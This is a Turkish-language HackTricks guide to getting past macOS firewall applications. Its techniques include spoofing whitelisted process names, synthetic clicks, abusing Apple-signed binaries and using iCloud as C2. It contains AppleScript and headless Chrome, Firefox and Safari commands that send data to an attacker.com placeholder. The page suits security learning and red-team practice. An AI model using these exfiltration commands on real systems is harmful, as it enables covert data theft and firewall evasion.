# macOS Güvenlik Duvarlarını Aşma

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Bulunan teknikler

Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışır durumda bulundu.

### Beyaz liste isimlerini kötüye kullanma

* Örneğin, kötü amaçlı yazılımı **`launchd`** gibi iyi bilinen macOS süreçlerinin isimleriyle çağırmak.

### Sentetik Tıklama

* Güvenlik duvarı kullanıcıdan izin istiyorsa, kötü amaçlı yazılımın **izin ver** butonuna tıklamasını sağlamak.

### **Apple imzalı ikilileri kullanma**

* **`curl`** gibi, ama ayrıca **`whois`** gibi diğerleri de.

### İyi bilinen apple alanları

Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alanlarına bağlantılara izin veriyor olabilir. Ve iCloud, bir C2 olarak kullanılabilir.

### Genel Bypass

Güvenlik duvarlarını aşmayı denemek için bazı fikirler.

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak beyaz listeye alınmış alanları veya hangi uygulamaların onlara erişmesine izin verildiğini belirlemenize yardımcı olacaktır.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS İstismar Etme

DNS çözümlemeleri, muhtemelen DNS sunucularıyla iletişim kurmasına izin verilecek olan **`mdnsreponder`** imzalı uygulama aracılığıyla gerçekleştirilir.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tarayıcı Uygulamaları Aracılığıyla

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Süreç enjeksiyonları aracılığıyla

Eğer herhangi bir sunucuya bağlanmasına izin verilen bir **süreç içine kod enjekte edebilirseniz**, güvenlik duvarı korumalarını aşabilirsiniz:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referanslar

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
